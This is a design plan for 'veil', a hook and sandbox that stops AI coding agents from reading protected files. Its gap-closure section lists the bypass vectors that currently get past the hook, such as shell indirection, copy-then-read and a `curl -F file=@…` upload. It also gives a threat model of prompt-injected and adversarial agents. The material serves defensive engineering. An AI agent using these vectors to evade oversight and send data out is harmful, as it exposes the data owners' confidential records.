# veil — Implementation Plan

## Overview

veil is a data exfiltration guard for AI coding agents. It prevents agents from
reading sensitive file contents into their context window while allowing
orchestration of spine tools that process those files as authorized
subprocesses.

Architecturally modeled after [dcg](https://github.com/Dicklesworthstone/destructive_command_guard) (Destructive Command Guard), which intercepts destructive commands. veil intercepts data access.

`veil` is not boundary attestation. `airlock` owns proof of what crossed the
model boundary. `veil` owns prevention of raw sensitive reads before any model
boundary exists.

---

## Architecture

### Position in the stack

`veil` sits upstream of `airlock`:

```text
dcg / veil
  -> local tool execution
  -> authorized spine subprocesses
  -> derived telemetry artifacts
  -> airlock assemble / verify
  -> model request
```

- `dcg` blocks destructive commands
- `veil` blocks raw sensitive reads
- `airlock` proves what derived artifacts crossed into the model request

### Hook Integration

veil registers as a Claude Code `PreToolUse` hook with multiple matchers:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Read",
        "hooks": [{ "type": "command", "command": "/absolute/path/to/veil" }]
      },
      {
        "matcher": "Grep",
        "hooks": [{ "type": "command", "command": "/absolute/path/to/veil" }]
      },
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "/absolute/path/to/veil" }]
      }
    ]
  }
}
```

`veil install` should write the currently running executable path into those
hook entries rather than assuming a fixed install location.

#### Hook ordering with dcg

Both veil and dcg register PreToolUse hooks on `Bash`. Claude Code runs all matching hooks — if any returns deny, the tool call is blocked. This means:

- **No conflict:** Both hooks fire independently. dcg checks for destructive commands, veil checks for data exfiltration. A command can be blocked by either or both.
- **No ordering dependency:** Each hook makes its own allow/deny decision. They do not need to coordinate.
- **Spine tool pass-through:** dcg has no reason to block spine tool invocations (they are not destructive). veil explicitly allows them. Both will return allow for `shape data.csv`.

### Decision Pipeline

```
Hook Input (JSON on stdin)
    │
    ▼
┌─────────────────────────────────────┐
│  1. Parse hook input                │
│     - Detect protocol (Claude/      │
│       Gemini/Copilot)               │
│     - Extract tool type + args      │
│     - Extract file path(s)          │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  2. Path extraction                 │
│     - Read tool: file_path field    │
│     - Grep tool: path field +        │
│       check output_mode (only       │
│       "content" leaks data;         │
│       "files_with_matches" is safe) │
│     - Bash: parse cat/head/tail/    │
│       less/python -c/node -e args   │
│     - Normalize relative → absolute │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  3. Allowlist check (fast path)     │
│     - Exact match on safe files     │
│     - Glob match on safe patterns   │
│     - If safe → ALLOW (silent)      │
└──────────────┬──────────────────────┘
               │ not allowlisted
               ▼
┌─────────────────────────────────────┐
│  4. Sensitivity classification      │
│     - Match against protected       │
│       path patterns                 │
│     - Check sensitivity packs       │
│       (secrets, PII, compliance)    │
│     - Score confidence              │
│     - If NOT sensitive → ALLOW      │
│       (audit log only)              │
└──────────────┬──────────────────────┘
               │ sensitive
               ▼
┌─────────────────────────────────────┐
│  5. Spine tool check (Bash only)    │
│     - Is this a spine tool          │
│       subprocess invocation?        │
│     - e.g., "shape data.csv"        │
│     - If spine tool → ALLOW (audit) │
│     - N/A for Read/Grep (those      │
│       always read into context)     │
└──────────────┬──────────────────────┘
               │ not spine tool
               ▼
┌─────────────────────────────────────┐
│  6. Policy resolution               │
│     - Apply per-sensitivity policy  │
│     - Deny / Warn / Log            │
│     - Generate explanation          │
│     - Suggest spine tool alternative│
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  7. Output                          │
│     - JSON to stdout (hook proto)   │
│     - Colorful warning to stderr    │
│     - Append to audit log           │
└─────────────────────────────────────┘
```

### Configuration Layers

Precedence (highest to lowest):

1. **Environment variables** — `VEIL_PROTECTED`, `VEIL_POLICY`, etc.
2. **Project config** — `.veil.toml` at repo root
3. **User config** — `~/.config/veil/config.toml`
4. **System config** — `/etc/veil/config.toml`
5. **Compiled defaults** — built-in safe patterns

### Sensitivity Packs (Modular)

Following dcg's pack architecture:

| Pack | What It Protects |
|------|-----------------|
| `core.filesystem` | Common sensitive paths (`.env`, `.ssh/`, `*.pem`, `*.key`) |
| `core.credentials` | API keys, tokens, database URLs in config files |
| `data.tabular` | CSV/TSV/parquet files — only triggers inside `[sensitivity] protected` directories, not globally on extension |
| `data.xml` | XML filings (NPORT, EDGAR, etc.) — only triggers inside protected directories |
| `data.database` | SQLite, DuckDB, dump files — triggers globally (databases are always sensitive) |
| `compliance.financial` | Financial data, fund holdings, trading records |
| `compliance.pii` | Personally identifiable information |
| `compliance.hipaa` | Health records |

### Spine Tool Authorization

veil maintains a registry of authorized spine tools. When a Bash command matches the pattern `<spine-tool> [flags] <file>`, it's treated as an authorized subprocess invocation — the spine tool processes the file, not the agent.

```toml
[spine]
authorized_tools = [
    "shape", "rvl", "vacuum", "hash",
    "fingerprint", "profile", "canon", "lock", "pack",
]
# Custom tools can be added per-project
```

This list should stay limited to tools that operate on protected files without
exposing raw contents to the agent. `airlock` does not belong in this list
because it operates downstream on derived telemetry and prompt artifacts, not
on raw sensitive files.

### Audit Trail

Every access attempt is logged. Default location is `~/.local/state/veil/audit.jsonl` (user-level, outside repo — avoids committing sensitive file paths to git). Overridable via `[policy] audit_path`:

```json
{
  "ts": "2026-03-01T16:00:00Z",
  "tool": "Read",
  "path": "data/clients/holdings.csv",
  "decision": "deny",
  "reason": "Protected by data.csv pack",
  "sensitivity": "compliance.financial",
  "confidence": 0.95,
  "session_id": "abc-123"
}
```

---

## Relationship to dcg and airlock

veil borrows heavily from dcg's architecture:

| Component | dcg | veil |
|-----------|-----|------|
| Hook type | PreToolUse (Bash) | PreToolUse (Read, Grep, Bash) |
| Input | Shell commands | File paths + shell commands |
| Patterns | Destructive command regexes | Sensitive path globs |
| Packs | Security packs (git, k8s, etc.) | Sensitivity packs (secrets, PII, etc.) |
| Allowlist | Command allowlists | File allowlists |
| Fast path | Keyword quick-reject | Safe pattern quick-allow |
| Policy | Deny/Warn/Log per pack | Deny/Warn/Log per sensitivity |
| Output | Block explanation + safe alternative | Block explanation + spine tool suggestion |
| Audit | SQLite history | JSONL audit log |

### Key Difference: Default Stance

- **dcg is fail-open:** Unknown commands are allowed (most commands are safe)
- **veil is fail-open by default** but supports **fail-closed per directory:** The global default must be fail-open (an agent that can't read any files is useless). But for explicitly protected directories, the stance inverts — unknown files inside a protected directory are treated as sensitive and resolved through policy. This is configured via `[sensitivity] protected` patterns, not a global toggle.
- **Canonical contract:** Unknown files outside protected directories are allowed. Unknown files inside protected directories are resolved through `[policy] default`. Classified-sensitive files anywhere are resolved through pack-specific rules or `[policy] default`.
- **On timeout/error:** Always fail-open. A guard that blocks the agent due to its own bugs is worse than no guard. Audit-log the timeout so operators can investigate.

### Different problem than airlock

`airlock` solves a different problem:

| Tool | Primary question |
|------|------------------|
| `dcg` | Is this command destructive? |
| `veil` | Would this tool call expose raw sensitive file contents to the agent? |
| `airlock` | What exact prompt/request bytes crossed into the model, and what claim level was earned? |

So:

- `veil` is a preventive local guard
- `airlock` is a deterministic boundary attestor
- neither replaces the other

---

## Build & Distribution

### Binary

Single Rust binary, same release profile as spine tools:

```toml
[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
```

### Installation

```bash
# Homebrew
brew tap cmdrvl/tap
brew install cmdrvl/tap/veil

# Installer script
curl -fsSL https://raw.githubusercontent.com/cmdrvl/veil/main/install.sh | bash

# Build from source
cargo install --path .
```

### Installer

Following dcg's installer pattern:
- Auto-detects platform (macOS arm/intel, Linux arm/intel)
- Downloads pre-built binary from GitHub Releases
- Configures `~/.claude/settings.json` hook entries
- Idempotent (safe to re-run)
- Supports `--uninstall`, `--status`, `--dry-run`

---

## CLI Subcommands

```bash
veil                    # Hook mode (reads stdin, called by Claude Code)
veil test <path>        # Test if a file would be blocked
veil explain <path>     # Show why a file is sensitive
veil scan <dir>         # Scan directory for sensitivity classification
veil packs              # List available sensitivity packs
veil config             # Show resolved configuration
veil audit              # Show recent audit log entries
veil doctor             # Self-test installation health
veil install            # Configure hooks in settings.json
veil uninstall          # Remove hooks from settings.json
```

---

## Out of Scope (v0)

**Write/Edit tools are not guarded.** veil prevents data from entering the agent's context. It does not prevent the agent from writing data that's already in context to files. An agent could theoretically capture spine tool output to a file, commit it, and push — but this is a different threat (exfiltration via output) than the one veil addresses (exfiltration via input). Guarding writes is a future consideration, not a v0 requirement.

**PostToolUse output filtering is not guarded.** When spine tools run as subprocesses, their stdout is captured back into the agent's context. veil trusts spine tool output by design (redacted by default). Filtering subprocess output would require a PostToolUse hook, which is architecturally different from PreToolUse interception.

**Model-boundary proof is not guarded.** If a workflow later sends derived
telemetry or summaries to a model, `veil` does not prove that boundary.
`airlock` is the companion tool for that job.

**Outbound body policy is not guarded.** `veil` can guard local paths referenced
by an outbound workflow, including attachment paths, but it does not classify
message bodies or decide whether a send is allowed. Relationship-specific
disclosure policy, approval state, counterpart identity, and final send
authorization belong in the calling wrapper and a later external send-policy /
disclosure service.

This boundary is intentional:

- `veil` answers: would this tool call expose raw local file contents to the
  agent?
- the wrapper answers: should this outbound body or action be allowed for this
  counterpart and context?
- the external send-policy / disclosure service answers: is this authenticated
  surface allowed to perform this send with these attachments and disclosures?

Do not add generic outbound content-screening semantics to `veil`. It is allowed
to inspect file paths before an outbound action; it is not responsible for
moderating prose already present in the agent context.

---

## Interaction with Spine Tool Redaction

veil and spine tool `--explicit` flags are complementary:

| Layer | What It Does |
|-------|-------------|
| **veil** | Prevents agent from reading raw files into context |
| **spine --redacted (default)** | Spine tool output shows structure, not values |
| **spine --explicit** | Opt-in to full values in spine output |

In zero-retention environments:
- veil blocks all direct file access
- Spine tools run with redacted output (default)
- Agent sees only structural metadata
- For debugging, operator can run spine tools with `--explicit` outside the agent

---

## Performance Budget

Following dcg's performance model:

| Phase | Budget |
|-------|--------|
| Parse hook input | < 100µs |
| Path extraction | < 100µs |
| Allowlist check | < 200µs |
| Sensitivity classification | < 500µs |
| Policy resolution | < 100µs |
| **Total** | **< 1ms** |

If budget exceeded → allow with audit log (fail-open).

---

## Testing Strategy

### Unit Tests
- Path extraction from each tool type (Read, Grep, Bash)
- Allowlist matching (exact, glob, directory)
- Sensitivity pack matching
- Spine tool detection
- Configuration loading and merging

### Integration Tests
- End-to-end hook invocation with JSON stdin
- Multi-protocol support (Claude, Gemini, Copilot)
- Audit log writing
- Installer script

### Golden File Tests
- Known-sensitive paths → expected decisions
- Known-safe paths → expected allows
- Edge cases (symlinks, relative paths, `..` traversal)

### Property Tests
- Any path matching an allowlist pattern should never be denied
- Spine tool invocations on protected paths should be allowed (that's the authorized processing path)
- Unknown paths outside protected directories should not be denied by default
- Sensitive or protected-directory paths without an allowlist or spine-tool exception should resolve through policy

---

## Build Order

1. **Scaffold** — Cargo project, CI, release profile, installer
2. **Hook protocol** — Parse stdin JSON, detect protocol, extract tool type + path
3. **Path extraction** — Read, Grep, Bash path parsing
4. **Configuration** — Layered TOML config, sensitivity patterns
5. **Allowlist** — Safe pattern matching (fast path)
6. **Sensitivity packs** — Modular pack registry
7. **Spine tool detection** — Authorized subprocess check
8. **Policy engine** — Deny/Warn/Log resolution
9. **Output** — Hook response + stderr warning + audit log
10. **CLI subcommands** — test, explain, scan, packs, doctor
11. **Installer** — curl | bash, homebrew formula
12. **Hardening** — Symlink resolution, path traversal, edge cases

---

## Gap Closure Plan — 2026-09-02 reality check

### Where we actually are

`veil` 0.4.1 is installed, healthy, and has stopped real reads of `.env` and
`~/.cmdrvl/config`. But it is a shell-text parser with a fixed reader list.
A 36-vector probe against a protected directory allowed 22 reads:

| Class | Allowed today |
|-------|---------------|
| Unlisted readers | awk, sed, base64, xxd, perl, jq, sqlite3, duckdb, grep, rg |
| Shell indirection | `sh -c "cat …"`, `find -exec cat`, xargs, `$(cat …)`, `f=…; cat $f` |
| Copy-then-read | `cp data/x.csv /tmp && cat /tmp/x.csv`, `tar … \| base64` |
| Interpreter scripts | `python3 script.py`, `uv run python -c …` |
| Direct egress | `curl -F file=@data/x.csv https://…` |
| Grep tool | content mode on a directory (file path is denied, directory is not) |

Parser denylisting cannot win against indirection. The plan below states the
threat model per adversary class, then four tracks: **A** makes the hook
honest and much harder to trip; **B** adds OS-level enforcement so "the agent
cannot read protected paths" is mechanically true for any harness; **C** makes
zero-retention work mechanical with synthetic twins; **D** turns the session
into an attestable artifact that composes with airlock.

### Threat model, stated per adversary class

| Adversary | Hook-only today (H) | Planned Track A (H+A) | Planned macOS Track B (H+S) | Planned Linux Track B (H+S) |
|-----------|---------------|---------------|---------------------|---------------------|
| A0 accidental direct read | Blocks direct protected reads on supported hook events; shell indirection remains a gap. | Blocks enumerated argv, shell, script, and content-search vectors; remains parser coverage, not an OS boundary. | Denies opens of compiled protected paths by the sandboxed process tree, independent of reader program. | Allows reads only inside configured read-allowlisted hierarchies. A protected-glob deny policy is not yet expressible with the current file layout. |
| A1 prompt-injected known vector | Blocks only recognized read/upload vectors. | Blocks listed read and egress classes; unknown binaries and encodings remain possible. | Prevents protected-path reads; does not stop egress of readable or broker-returned data. Network egress needs Track D. | Same read claim only for a correctly restricted allowlist; egress remains separate. |
| A2 adversarial arbitrary code | Does not stop arbitrary readers. | Raises cost but does not stop arbitrary code. | Blocks protected-path opens by the confined tree if profile coverage is complete and no protected descriptor or alternate accessible alias was inherited. Broker mistakes remain a trusted-boundary risk. | Can make an A2 read claim only when every readable hierarchy is explicitly allowed and protected data is outside those hierarchies. Landlock cannot allow a broad parent and then subtract a protected child. |
| A3 compromised host | Out of scope. | Out of scope. | Out of scope: the host operator can change policy or read source files outside the confined tree. | Out of scope for the same reason. |

Every public claim is made per row and names the active enforcement level.
Planned columns describe target behavior, not shipped features. Today veil is a
hook-mode A0 tool. Track B can make an A2 read claim only on a backend whose
complete filesystem policy is installed before the harness starts. That claim
does not include model-bound egress: Track D/airlock is still required.

### Formal model (what "correct" means)

Treat every file or registered content object as carrying a **label** from a
small lattice `public < derived < protected`, and every process as running at a
**clearance**. Rules:

- `Read(f)` by the agent is allowed iff `label(f) ≤ clearance(agent)`, and the
  agent's clearance is `derived`. A Track B harness receives that clearance
  only after its OS policy is applied; hook mode alone does not establish it.
- The broker runs at clearance `protected`. Each authorized tool declares an
  output class; the broker labels its output accordingly, registers the output
  hash with that label, and returns it only when the label is at most
  `derived`. Raw flags such as `--explicit`, `--raw`, `--dump`, or
  `--show-values` classify the result as `protected` and are refused. A content
  scan can catch known secrets or PII, but cannot prove that an output is safe
  to declassify.
- Labels are monotone under copy: `cp`, `tar`, `base64`, and redirection produce
  outputs with the join of their input labels. Hooks can deny known copy
  vectors but cannot track arbitrary copies. Track B prevents a copy only when
  the protected source is unreadable to the sandboxed process and the launcher
  does not pass it an already-open descriptor or another accessible alias.
- OS policy is path-based, not a general content-taint engine. The compiler
  must map configured protected paths and aliases to the effective filesystem
  policy; the broker's content-hash registry records provenance for broker
  outputs, not labels for arbitrary files an agent creates.

This is a cut-down decentralized label model. It replaces three ad hoc
notions (protected globs, safe globs, spine allowlist) with one invariant and
gives the property tests something to check: **enforcement dominance**, i.e.
every protected-read decision the hook denies is also denied by the compiled
sandbox policy, and every broker output labelled `public` or `derived` is
readable inside the sandbox. Egress denials and unsupported path mappings are
not covered by that property.

### Track A — hook hardening (0.5): honest, measured, generated claims

1. **Path-anywhere-in-argv rule.** Any simple command whose argv resolves a
   protected path is resolved through policy unless the command is an
   authorized spine tool. Replaces the reader allowlist as the primary rule
   and covers awk/sed/jq/base64/cp/tar/curl/scp in one move. Protected-pattern
   matching moves to a segment radix trie with glob leaves so ten thousand
   patterns still resolve inside the 1 ms budget.
2. **Shell decomposition.** Split on `;`, `&&`, `||`, `|`, `$(…)`, backticks;
   unwrap `sh|bash|zsh -c`, `env`, `nice`, `time`, `timeout`, `xargs`,
   `find -exec`, `uv run`, `pipx run`, `poetry run`, `npx`. Evaluate every
   simple command; first deny wins; every segment audited with its origin.
   Redirections are stripped (they currently pollute the audit log as paths).
3. **Dynamic-argument stance.** Reader/egress commands with unresolvable
   `$VAR`, `{}` or glob args while a protected directory is in scope are
   denied (`dynamic_path_unresolvable`) after same-command assignments are
   substituted. The one deliberately fail-closed rule; `[policy] dynamic_args`
   configures it.
4. **Interpreter script inspection.** Bounded (256 KiB) static scan of script
   files handed to python/node/ruby/perl/bash for accessors and protected
   literals. Best effort; the remediation text says so.
5. **Directory-scope content search.** Grep tool content mode and Bash
   grep/rg on a directory containing protected patterns is denied;
   `-l`/`--files` forms allowed with audit.
6. **Egress class.** curl/wget uploads, scp, rsync, `aws s3 cp`, `gsutil`,
   `gh release upload`, mail attachments: protected path in argv → deny with
   `class: egress`. `veil audit --class egress` answers "did anything try to
   leave".
7. **MCP tool argument screening.** PreToolUse fires for `mcp__*` tools. Any
   string argument that resolves to a protected path (attachment to a
   send-email tool, file id to an upload tool) is screened with the same
   rule. This is the mechanical form of bd-3mr and the Cairn send path.
8. **Content-sniff classification.** For files *outside* protected
   directories, veil itself (not the agent) reads the first 4 KiB, checks
   magic bytes (SQLite, parquet, xlsx zip, PDF) and a cheap PII density score
   (SSN, Luhn-valid card numbers, emails per KiB) using the shared
   `boundary-detectors` crate. A hit upgrades the file to `protected` for
   this decision. Cached by `(dev, inode, mtime)`. Thresholds are per
   detector and source files under a git work tree are exempt from the email
   detector (commit trailers). Unknown files outside protected directories
   remain `public` (fail-open) unless the sniff upgrades them; this closes
   extension renames and "the export landed in `~/Downloads`". Supersedes
   bd-28k.
9. **Provenance-based safe allowlist.** `*-report.json` globs are spoofable
   (`cp data.csv foo-report.json`). Files produced through the broker are
   registered by content hash in `~/.cmdrvl/state/veil/derived.jsonl` and a
   Read of a registered hash is allowed as `derived`. Glob allowlists remain
   for docs and config but never override a protected-directory or sniff hit.
10. **Enforcement-level honesty.** `veil doctor`, every audit entry, and the
    README carry `enforcement: hook-only | sandboxed`. The 36-vector probe
    becomes `tests/bypass_matrix.rs`; `docs/bypass-matrix.md` is generated
    from it and CI fails on drift. README alt text stops claiming grants.
11. **Replay harness.** `veil replay --audit <jsonl>` re-evaluates historic
    Bash entries under the new rules and reports allow→deny flips, so the
    false-positive cost of every rule is a number in the release notes.

### Track B — OS sandbox enforcement (1.0): ADR B-1

**Status (2026-11-25):** Adopt the hybrid direction below; implementation and
platform claims remain gated. This ADR chooses an architecture, not a shipped
security feature. The current CLI has hook/operator commands but no `sandbox`
or `exec` command ([`src/cli.rs`](../src/cli.rs)); hook evaluation is in
[`src/lib.rs`](../src/lib.rs). The spine authorization and denied-flag table
already in [`src/spine.rs`](../src/spine.rs) is reusable by a future broker.
[`src/protected_corpus.rs`](../src/protected_corpus.rs) prepares an egress
filter for airlock; it does not prevent local reads.

#### Decision

Keep hook mode as the default and supported compatibility path. Add an explicit
`veil sandbox -- <harness command>` mode that launches the harness and its
children under an OS policy, while keeping hooks inside the sandbox for UX and
audit. Start the broker before confinement so authorized spine tools can read
protected inputs without giving that access to the harness process tree. Stamp
`enforcement: sandbox` only after the requested backend is applied and verified;
an explicit sandbox request fails if policy compilation or application fails.
It must never silently fall back to hook-only enforcement.

#### Options and costs

| Option | Cost and limits | Decision |
|--------|-----------------|----------|
| **H — Hook-only** (current) | Lowest deployment cost and works through supported hook integrations. It depends on parser coverage, so unlisted readers, shell indirection, and alternate runtimes remain gaps. | Keep as the default and describe it as hook-only. |
| **H+A — Hook plus Track A hardening** | Medium, continuing cost: shell/argv decomposition, script inspection, egress classification, harness integration, and replay-driven false-positive work. It improves known-vector coverage but cannot constrain arbitrary code. | Keep as defense-in-depth; do not call it OS enforcement. |
| **S — Replace hooks with a mandatory sandbox launcher** | High migration cost: every harness must be launched through veil; hook UX and maintenance flows disappear outside that launcher. It still needs a broker and does not solve Linux path-policy semantics. | Reject as the product-wide replacement. |
| **H+S — Hook plus opt-in sandbox launcher and broker** | Highest engineering and support cost: two OS backends, path/pattern compilation, child lifecycle, inherited-descriptor hygiene, broker protocol and output policy, plus per-OS/kernel testing. It preserves hook compatibility and can provide an A2 read boundary on a verified backend. | **Recommend.** Keep H as default until a backend ships; gate the Linux A2 claim on a viable Landlock policy model. |

A sandbox without a broker is also rejected: it would prevent authorized spine
tools from reading protected inputs and break veil's core processing path. The
broker is a narrow capability boundary, not a general shell service.

#### Claims by adversary class

The table above names the options; this table states their security claims.
“Track B” is platform-specific. A successful macOS profile does not prove a
Linux policy, and neither backend controls network egress by itself.

#### Process and broker sequence

```mermaid
sequenceDiagram
    actor Agent
    participant V as veil sandbox launcher
    participant B as veil broker (protected clearance)
    participant OS as Seatbelt or Landlock
    participant H as Harness process tree (derived clearance)
    participant T as Authorized spine tool

    V->>V: Load policy; resolve protected paths and aliases
    V->>B: Start per-session broker outside confinement
    V->>B: Create private socket (0600)
    V->>OS: Compile and apply filesystem policy
    OS->>H: Launch harness; descendants inherit confinement
    H->>OS: Open protected file directly
    OS-->>H: Deny read
    H->>B: veil exec sends typed {tool, argv}
    B->>B: Check tool, flags, output class, and size limit
    B->>T: Run authorized tool with protected access
    T-->>B: Return output
    B->>B: Scan, label, hash, and audit output
    B-->>H: Return only output labelled public or derived
    H-->>V: Exit; launcher stops broker and closes session state
```

The request contains an executable identity and an argv vector, never a shell
string. Reuse `src/spine.rs`'s authorization and denied-flag logic. The broker
socket is session-scoped and mode `0600`; calls are capped, audited with input
and output hashes, and the broker exits with its launcher. Output scanning
using `boundary-detectors` is a secondary check, not proof that a declared
`derived` result contains no protected information. Each tool therefore needs
an explicit output-class contract; protected-class results are refused.

#### Backend constraints and costs

- **macOS / Seatbelt:** Generate a profile from merged config using `deny
  file-read*` for resolved protected paths. Resolve symlinks and deny both the
  configured path and its resolved target. `sandbox-exec` is deprecated, so
  availability and profile behavior must be checked on every supported macOS
  release. On this machine, macOS 15.8.3 has `/usr/bin/sandbox-exec`; the
  evidence below proves only a literal-path deny inherited by a child process.
  It does not establish profile portability or future OS support.
- **Linux / Landlock:** The existing plan's “deny protected directories” model
  is not a direct Landlock translation. Landlock denies handled rights by
  default and filesystem rules grant access to hierarchies; it has no negative
  child rule that subtracts a protected glob after a broad parent is allowed.
  This follows from the kernel's [Landlock userspace API](https://docs.kernel.org/userspace-api/landlock.html): a path rule grants the listed rights, and access requires an allowing rule in each enforced policy layer. Therefore a broad read allow for `/` or a home/workspace root would also include protected descendants. A Linux design must either use an explicit read-allowlist whose hierarchies exclude protected data, constrain the data/workspace layout, or choose a different backend. Until that tradeoff is accepted and tested, Linux Track B has no general protected-glob A2 claim. Runtime ABI/support probing is mandatory. Landlock also does not revoke file descriptors opened before confinement; the launcher must not pass read-capable descriptors for protected files.
- **Egress:** Filesystem confinement does not prevent sending data that the
  agent can already read or that a broker returns. Track D/airlock owns the
  network boundary. Linux Landlock TCP-port rules require ABI 4; network
  namespace or macOS `pf` composition remains a separate Track D decision.
- **Identity and failure:** Keep the broker outside the harness policy, deny
  ptrace/process-memory paths where supported, use a private socket, and never
  label output `derived` solely because a detector found no match. If any
  protected path cannot be covered, the backend must fail its sandbox request
  rather than stamp a stronger enforcement level.

#### Decision evidence and rollout gates

Minimal local Seatbelt spike (2026-11-25, macOS 15.8.3 / Darwin 24.6.0):
reading this repo's `README.md` with `/bin/cat` succeeded outside the sandbox.
A profile `(version 1) (allow default) (deny file-read* (literal
"<repo>/README.md"))` then ran `/bin/sh` which launched `/bin/cat`; the child
reported `Operation not permitted` and the wrapper printed `seatbelt read:
denied`. This makes a macOS process-boundary mode technically viable enough to
recommend as an opt-in direction. It did not test a generated profile, globs,
symlink/hardlink aliases, the veil broker or `veil exec` round-trip, Linux
Landlock, or a Linux CI job. No spike binary or fixture file was created.

Before advertising Track B on a platform, require: (1) property/bypass tests
show every supported protected-read rule is denied; (2) tests show ordinary
workspace reads and required harness startup continue to work; (3) symlinks,
hard links, pre-opened descriptors, mounts, and policy-update races have an
explicit treatment; (4) the broker round-trip accepts only registered tools
and returns only `public`/`derived` output; (5) failures are visible and never
downgrade `sandbox` to `hook-only`; and (6) each README claim points to the
matching adversary row above. Linux additionally needs a documented choice
between a restricted allowlist workspace and a different backend, plus a real
Landlock test in Linux CI.

Other alternatives remain rejected: FUSE overlays add a second filesystem
view and mount/metadata complexity; ptrace is slow and fragile; `LD_PRELOAD`
can be bypassed by static binaries or direct syscalls. Endpoint Security is
out of scope because it requires entitlements.

### Track C — twin mode for zero-retention work

The README's "Zero-Retention Mode" (the agent writes a pipeline the client
runs themselves) is prose today. `veil sandbox --twin` mounts synthetic
look-alike data in place of each protected directory: same schema, same file
names, fabricated values from the twinning tooling already used for warehouse
eval packs. The agent develops and tests against the twin; the operator runs
the frozen script on real data through the broker. The session attestation
(Track D) records that no real byte was ever readable. This is the strongest
form of "your data never entered the model", and it is a demo, not a policy.

### Track D — session attestation and composition with airlock

- Denials and broker calls are appended to the spine witness ledger
  (`~/.cmdrvl/state/witness/witness.jsonl`) as well as the audit log, and
  each session's entries are chained (`prev_hash`) so the log is
  tamper-evident, not merely append-only.
- `veil attest --session <id>` emits a signed summary: protected reads
  attempted and denied, broker invocations with tool and output hashes,
  enforcement level, twin mode. Airlock embeds it so a manifest can carry
  `LOCAL_READS_CLEAN`: not only "the request had no raw document" but "no raw
  document entered the agent while the prompt was assembled".
- Unified launcher: `veil sandbox --egress airlock` starts the airlock gate
  and, on Linux, places the harness in a network namespace whose only route
  is the gate; on macOS, installs a pf rule scoped to the sandbox group.
  Reads gated by the broker, network gated by airlock: a sealed workstation
  for agents, launched with one command.

### Non-goals restated

Write/Edit guarding and PostToolUse output filtering remain out of scope.
Outbound *message body* policy stays with the calling wrapper / external disclosure service.
Endpoint Security and kernel extensions are out of scope.

### Tracking

Beads under epic `bd-30b`. Existing backlog bypass beads (`bd-28k`, `bd-r93`,
`bd-3pm`, `bd-hf9`) are superseded by Track A items 1, 6 and 8.

---

## System Integration & Agent-Ergonomic Synthesis — 2026-11-24

Within the unified CMD+RVL architecture (`cmdrvl/docs/SYSTEM_ARCHITECTURE.md`),
`veil` is not a standalone Claude hook — it is the **Ingress Half of Orthogonal
Plane A (the Boundary & Exposure Lattice `public < derived < protected`)**.

### Architectural invariants added for v1

1. **Hook-mode raw-dump flag guard + safe remediation (`bd-en1`, P0):**
   Enforce `[spine.denied_flags]` (`--explicit`, `--raw`, `--dump`, `--show-values`)
   immediately in hook mode (`src/spine.rs` + `src/evaluator.rs`) and reuse the
   exact same flag table in the Track B broker (`bd-27o`). Rewrite
   `DIRECT_READ_REMEDIATION` so `veil` never instructs an agent to write an
   ad-hoc bypass script; instead emit structured recovery pointing to
   `veil operator --json` or `veil exec <tool> <path>` when sandboxed.
2. **Shared `boundary-detectors` crate (`bd-jg9`, P1):**
   Extract one pure-Rust (`#![forbid(unsafe_code)]`, deterministic, zero-ML)
   detector crate consumed by both `veil` (content sniff `bd-35u`, broker stdout
   scan `bd-27o`) and `airlock` (`al-34s`, `al-cuh`). Includes Aho-Corasick
   literals, regex/Luhn/entropy packs, bounded recursive base64/hex
   decode-and-rescan, magic-byte sniffing, and the one-way rolling shingle Bloom
   filter.
3. **Interactive-agent default for `veil sandbox --egress airlock` (`bd-3g5`, P1):**
   Default `--egress-mode` to `policy-proxy` for interactive coding harnesses
   (`claude`, `codex`, `gemini`, Cursor) so Turn 1 never 403s for a missing
   pre-assembled manifest; expose `--egress-mode strict-manifest` for
   deterministic batch pipelines and `evidence-protocol` runtimes. Export
   `OPENAI_BASE_URL`, `ANTHROPIC_BASE_URL`, and `GEMINI_BASE_URL` pointing to
   the localhost gate.
4. **Protected-corpus one-way shingle Bloom filter (`bd-d97`, P1):**
   At `veil sandbox --egress airlock` startup (outside the sandbox), build a
   one-way rolling-hash Bloom filter over `[sensitivity] protected` files
   (excluding common repo boilerplate; zero raw bytes stored) and hand only the
   filter to `airlock gate --protected-bloom` so proprietary holdings, deal
   prose, and client records are caught on the wire even without regex patterns.
5. **Warehouse/DB twin integration (`bd-2ex`):**
   Extend `veil sandbox --twin` beyond local file overlays to pair directly with
   `cmdrvl/twinning`: inject local synthetic Postgres/Snowflake endpoints
   (`DATABASE_URL`, `PGHOST`, `PGPORT`, `SNOWFLAKE_*`) while sandbox network
   rules block real production warehouse egress.
6. **Fractal agent posture projection (`control.v0` / `cmdrvl orient`):**
   `veil --robot-triage`, `veil doctor health --json`, and `veil attest` expose
   the uniform `boundary` posture object (`enforcement`, `twin_mode`,
   `egress_mode`, `violations`, `derived_registry_hash`) consumed by
   `cmdrvl orient --json` and `control.v0` packets so a cold agent learns its
   exact clearance in one call (~500 tokens).
7. **Runtime & scope discipline:**
   - Keep `veil` hook mode **100% synchronous** (zero async runtime, `<1ms`
     cold start). Broker (`bd-27o`) may use tiny sync threads or `asupersync`.
   - Prioritize unprivileged OS backends for v1 (**macOS Seatbelt** + **Linux
     Landlock ABI 4+**); treat root `netns`/`veth` and `pf` anchors as optional
     hardening recipes.
   - Keep `docs/jev_sidecar_plan.md` strictly quarantined as offline research,
     out of `veil` v1.

